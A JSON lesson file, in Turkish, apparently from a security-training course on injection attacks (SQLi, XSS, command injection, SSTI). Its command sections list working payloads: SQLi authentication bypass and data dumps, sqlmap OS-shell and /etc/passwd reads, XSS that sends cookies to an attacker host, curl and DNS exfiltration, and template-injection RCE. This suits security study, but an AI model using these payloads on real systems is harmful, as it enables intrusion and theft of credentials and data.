@@ -1,0 +1,155 @@
+{
+  "id": "injection",
+  "slug": "injection",
+  "title": "A03 — Injection",
+  "subtitle": "SQL, XSS, Command, SSTI, XXE Enjeksiyon Saldırıları",
+  "description": "Kullanıcı girdisinin yorumlayıcıya (SQL, OS, LDAP) komut olarak işlenmesi. SQLi, XSS, Command Injection, SSTI, XXE.",
+  "icon": "💉",
+  "order": 3,
+  "tags": ["SQLi", "XSS", "command injection", "SSTI", "XXE", "LDAP injection", "NoSQL injection"],
+  "modules": [
+    {
+      "id": "injection-intro",
+      "title": "Injection Nedir?",
+      "description": "Enjeksiyon saldırılarının mantığı ve türleri",
+      "difficulty": "beginner",
+      "duration": "10 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Injection Saldırısının Temel Mantığı",
+          "content": "**Injection:** Kullanıcı girdisi, veri olarak işlenmek yerine **komut** olarak yorumlanır.\n\n**Türler:**\n| Tür | Yorumlayıcı | Örnek Payload |\n|-----|-------------|---------------|\n| SQL Injection | Veritabanı | `' OR 1=1--` |\n| XSS | Browser (HTML/JS) | `<script>alert(1)</script>` |\n| Command Injection | OS Shell | `; whoami` |\n| SSTI | Template Engine | `{{7*7}}` |\n| XXE | XML Parser | `<!ENTITY ...>` |\n| LDAP Injection | LDAP | `*)(uid=*))(|(uid=*` |\n| NoSQL Injection | MongoDB | `{\"$gt\": \"\"}` |\n\n**Temel Prensip:**\n- **Kötü:** `query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\"` → Injection\n- **İyi:** `query = \"SELECT * FROM users WHERE name = ?\"` + parametre bağlama → Güvenli"
+        }
+      ]
+    },
+    {
+      "id": "sql-injection",
+      "title": "SQL Injection — En Kapsamlı Rehber",
+      "description": "Manual SQLi, sqlmap, Union-based, Blind, Error-based, Time-based",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "SQL Injection Türleri",
+          "content": "**1. In-Band SQLi:**\n- **Error-based:** Hata mesajları veri sızdırır\n- **Union-based:** UNION SELECT ile ek veri çek\n\n**2. Blind SQLi:**\n- **Boolean-based:** `AND 1=1` (true) vs `AND 1=2` (false) — davranış farkından veri çıkar\n- **Time-based:** `AND SLEEP(5)` — gecikme ile veri çıkar\n\n**3. Out-of-Band SQLi:**\n- DNS/HTTP üzerinden veri çıkarma (xp_cmdshell, UTL_HTTP)\n\n**Kritik Hedefler:**\n- Kimlik doğrulama bypass\n- Tüm DB içeriğini dump etme\n- OS komut çalıştırma (stacked queries)\n- Dosya okuma/yazma"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "SQL Injection — Manuel ve Araç Kullanımı",
+          "commands": [
+            {
+              "command": "# Giriş formu SQLi tespiti:\n# Username alanına:\n' -- \n' OR '1'='1\n' OR 1=1--\n\" OR \"1\"=\"1\nadmin'--\n\n# Tablo sütun sayısını bul (ORDER BY yöntemi):\n' ORDER BY 1--   # hata yok\n' ORDER BY 2--   # hata yok\n' ORDER BY 3--   # hata → 2 sütun var",
+              "description": "SQLi tespiti ve sütun sayısı belirleme"
+            },
+            {
+              "command": "# Union-based SQLi — veri çıkarma:\n# DB versiyonu:\n' UNION SELECT 1,version()--\n# Tablolar:\n' UNION SELECT 1,table_name FROM information_schema.tables--\n# Sütunlar:\n' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--\n# Kullanıcılar:\n' UNION SELECT username,password FROM users--",
+              "description": "Union-based SQLi ile veritabanı bilgisi ve kullanıcı dump",
+              "tip": "UNION SELECT ile sütun sayısı eşleşmeli — önce ORDER BY ile sütun sayısını bul"
+            },
+            {
+              "command": "# Blind Boolean-based SQLi:\n# True durumu (normal response):\n' AND 1=1--\n# False durumu (farklı response veya hata):\n' AND 1=2--\n# Karakter karakter admin şifresini çek:\n' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--\n' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--\n# ... devam et",
+              "description": "Boolean-based Blind SQLi — karakter karakter şifre çıkarma"
+            },
+            {
+              "command": "# Time-based Blind SQLi:\n' AND SLEEP(5)--          # MySQL\n'; WAITFOR DELAY '0:0:5'--  # MSSQL\n' AND pg_sleep(5)--        # PostgreSQL\n\n# Şifrenin ilk karakteri 'a' mı? (5 saniye beklerse evet):\n' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--",
+              "description": "Time-based Blind SQLi — gecikme ile veri çıkarma"
+            },
+            {
+              "command": "# sqlmap — otomatik SQL injection tespiti ve exploit:\n# URL parametresi:\nsqlmap -u 'http://hedef.com/search?q=test' --dbs\n\n# POST request:\nsqlmap -u 'http://hedef.com/login' --data='username=admin&password=test' --dbs\n\n# Cookie ile auth:\nsqlmap -u 'http://hedef.com/profile' --cookie='session=TOKEN' -D myapp -T users --dump\n\n# OS shell al:\nsqlmap -u 'http://hedef.com/?id=1' --os-shell\n\n# File okuma:\nsqlmap -u 'http://hedef.com/?id=1' --file-read='/etc/passwd'",
+              "description": "sqlmap ile otomatik SQLi — DB dump, OS shell, file read",
+              "tip": "sqlmap --level=5 --risk=3 daha agresif test için — ama dikkatli: gerçek sistemlerde hasar verebilir"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "xss",
+      "title": "XSS — Cross-Site Scripting",
+      "description": "Reflected, Stored, DOM-based XSS ve pratik saldırı senaryoları",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "XSS Türleri",
+          "content": "**Reflected XSS:** Payload URL'de, tek seferlik — kurban linke tıklar, payload çalışır.\n\n**Stored (Persistent) XSS:** Payload veritabanına kaydedilir, her ziyaretçide çalışır — daha tehlikeli.\n\n**DOM-based XSS:** JavaScript, URL fragment'ini (`#...`) güvensiz biçimde innerHTML'e yazarsa.\n\n**XSS ile Neler Yapılabilir?**\n- Session cookie çalma → hesap ele geçirme\n- Keylogger — tuş yakalamak\n- Phishing formu ekleme\n- Kullanıcıyı zararlı siteye yönlendirme\n- Webcam/mikrofon erişimi (ağ içinde)"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "XSS Payloadları ve Cookie Çalma",
+          "commands": [
+            {
+              "command": "# Temel XSS tespit payloadları:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><script>alert(document.domain)</script>\n' onmouseover='alert(1)\n\n# Filter bypass:\n<ScRiPt>alert(1)</ScRiPt>            # case değişikliği\n<script>alert`1`</script>            # parantez bypass\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)> # HTML entity",
+              "description": "XSS tespit payloadları ve filtre bypass teknikleri"
+            },
+            {
+              "command": "# Cookie çalma payloadu:\n<script>\ndocument.write('<img src=\"https://saldirgan-sunucu.com/steal?c='+document.cookie+'\">');\n</script>\n\n# Daha gizli:\n<script>new Image().src='https://saldirgan-sunucu.com/?c='+btoa(document.cookie)</script>\n\n# Saldırgan sunucuda basit bir listener:\npython3 -m http.server 8000\n# access.log'a gelen cookie'leri gör",
+              "description": "XSS ile session cookie çalma — HTTPOnly olmayan cookie'ler için",
+              "tip": "HTTPOnly flag ayarlı cookie'ler JS ile okunamaz — bu flag daima aktif olmalı"
+            },
+            {
+              "command": "# DOM-based XSS tespiti:\n# URL: https://hedef.com/search#<script>alert(1)</script>\n# JavaScript'te bak:\ndocument.getElementById('results').innerHTML = location.hash.slice(1);\n# ↑ Güvensiz — location.hash direkt innerHTML'e yazılıyor!\n\n# XSS Hunter ile blind XSS:\n# https://xsshunter.com — payload sunucuna çağrı atar\n# Payload: <script src=https://seni.xss.ht></script>",
+              "description": "DOM XSS ve Blind XSS tespiti"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "command-injection",
+      "title": "Command Injection — OS Komut Çalıştırma",
+      "description": "Web uygulamasının shell komutlarını tehlikeli şekilde çağırması",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Command Injection Payloadları",
+          "commands": [
+            {
+              "command": "# Uygulama: ping butonu — input: IP adresi\n# Arka planda: system(\"ping \" + userInput)\n\n# Payloadlar:\n8.8.8.8; whoami\n8.8.8.8 && cat /etc/passwd\n8.8.8.8 | id\n8.8.8.8 `whoami`   # backtick\n8.8.8.8 $(whoami)  # command substitution\n\n# Windows:\n127.0.0.1 & whoami\n127.0.0.1 | net user\n127.0.0.1 && type C:\\Windows\\System32\\drivers\\etc\\hosts",
+              "description": "Command injection payload varyasyonları — Linux ve Windows"
+            },
+            {
+              "command": "# Blind command injection — zaman tabanlı:\n# Response değişmiyor ama komut çalışıyor\n8.8.8.8 && sleep 10\n8.8.8.8; ping -c 10 127.0.0.1\n\n# Out-of-band (DNS ile data exfil):\n8.8.8.8; nslookup `whoami`.BURP_COLLABORATOR_URL\n8.8.8.8; curl https://webhook.site/ID?data=$(id|base64)\n\n# Commix — otomatik command injection:\ncommix --url 'http://hedef.com/ping?ip=INJECT_HERE' --level=3",
+              "description": "Blind command injection ve out-of-band veri sızdırma"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ssti",
+      "title": "SSTI — Server-Side Template Injection",
+      "description": "Jinja2, Twig, Freemarker gibi template engine'lerde RCE",
+      "difficulty": "advanced",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "SSTI Tespit ve Exploit",
+          "commands": [
+            {
+              "command": "# Hangi template engine kullanılıyor?\n# Matematiksel ifade değerlendiriliyor mu?\n{{7*7}}       → 49 çıktısı: Jinja2 veya Twig\n${7*7}        → 49 çıktısı: Freemarker veya Thymeleaf\n<%= 7*7 %>    → 49 çıktısı: ERB (Ruby)\n#{7*7}        → 49 çıktısı: Ruby (Slim)\n\n# 49 görünüyorsa SSTI var!\n{{7*'7'}}     → 7777777: Jinja2\n{{7*'7'}}     → 49:       Twig",
+              "description": "Hangi template engine kullanıldığını tespit et"
+            },
+            {
+              "command": "# Jinja2 (Flask/Django) RCE:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Daha kısa:\n{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].decode()}}\n\n# Twig (PHP/Symfony) RCE:\n{{['id']|filter('system')}}\n{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n\n# Freemarker (Java) RCE:\n<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
+              "description": "Jinja2, Twig ve Freemarker SSTI'dan RCE alma",
+              "tip": "tplmap aracı farklı template engine'leri otomatik test eder"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
